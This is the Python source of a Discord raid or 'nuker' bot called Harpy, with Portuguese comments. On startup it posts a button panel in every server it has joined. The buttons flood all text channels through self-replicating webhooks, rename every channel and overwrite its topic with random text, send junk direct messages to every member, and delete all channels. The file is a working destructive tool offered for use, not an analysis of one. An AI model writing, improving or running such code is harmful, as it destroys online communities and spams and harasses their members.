from keep_alive import keep_alive
import discord
from discord.ext import commands
import os
import requests
import random
import string
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Utilitários
def gerar_texto(t=80):
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=t))

async def criar_webhooks_e_replicar(guild):
    for channel in guild.text_channels:
        for _ in range(3):
            try:
                webhook = await channel.create_webhook(name="ChaosHarpy")
                spam_webhook(webhook.url, channel)
            except: continue

def spam_webhook(url, channel):
    import threading
    def loop():
        while True:
            try:
                requests.post(url, json={"content": gerar_texto(200)})
                if random.randint(0, 3) == 0:
                    channel.guild.loop.create_task(channel.create_webhook(name="CloneHarpy"))
            except: break
    threading.Thread(target=loop).start()

async def renomear_mudar_topicos(guild):
    for channel in guild.text_channels:
        try:
            await channel.edit(name=gerar_texto(10), topic=gerar_texto(40))
        except: continue

async def destruir_canais(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except: continue

async def dm_massiva(guild):
    for member in guild.members:
        if not member.bot:
            try:
                await member.send(gerar_texto(300))
            except: continue

# Sistema de botões
class HarpyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Auto-Replicar Webhooks", style=discord.ButtonStyle.danger)
    async def auto_webhooks(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Ativando replicação...", ephemeral=True)
        await criar_webhooks_e_replicar(interaction.guild)

    @discord.ui.button(label="Renomear e Mudar Tópicos", style=discord.ButtonStyle.primary)
    async def renomear(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Mutação iniciada...", ephemeral=True)
        await renomear_mudar_topicos(interaction.guild)

    @discord.ui.button(label="DM em Massa", style=discord.ButtonStyle.success)
    async def dms(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Enviando DMs...", ephemeral=True)
        await dm_massiva(interaction.guild)

    @discord.ui.button(label="Destruir Canais", style=discord.ButtonStyle.secondary)
    async def destruir(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Destruição total iniciada...", ephemeral=True)
        await destruir_canais(interaction.guild)

# Evento de Pronto
@bot.event
async def on_ready():
    print(f"Harpy online: {bot.user}")
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                await channel.send("**Harpy Control Panel Ativado**", view=HarpyView())
                break
            except:
                continue

keep_alive()
bot.run(TOKEN)
    
